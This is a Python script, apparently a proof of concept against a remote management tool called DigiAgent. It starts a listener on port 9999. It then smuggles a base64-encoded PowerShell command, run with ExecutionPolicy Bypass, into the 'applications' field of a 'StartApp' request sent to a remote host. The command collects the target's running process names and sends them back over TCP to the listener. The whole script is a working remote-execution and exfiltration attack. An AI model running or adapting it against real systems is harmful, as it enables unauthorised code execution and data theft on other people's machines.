import socket
import threading
import time
import subprocess
import json
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 9999))
s.listen(1)

def srv():
    try:
        s.settimeout(12.0)
        conn, addr = s.accept()
        print('Connected by:', addr)
        data = b''
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()
        print(f'DATA RECEIVED: {len(data)} bytes')
        with open(r'C:\SynapseAISentinel\received_laptop.txt', 'wb') as f:
            f.write(data)
    except Exception as e:
        print('Server exception:', e)

th = threading.Thread(target=srv)
th.start()
time.sleep(0.5)

ps = """
$p = Get-Process | Select-Object -ExpandProperty ProcessName
$text = $p -join ", "
$bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
$client = New-Object System.Net.Sockets.TcpClient("100.99.161.43", 9999)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
"""
b64 = base64.b64encode(ps.encode('utf-16le')).decode()
payload = json.dumps({"applications": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {b64}"})

res = subprocess.run([
    r"C:\Program Files\DigiAgent\digiagent-cli.exe",
    "feature", "start", "100.119.119.73", "StartApp", payload
], capture_output=True, text=True)

print("CLI res:", res.stdout)
th.join(15.0)
s.close()
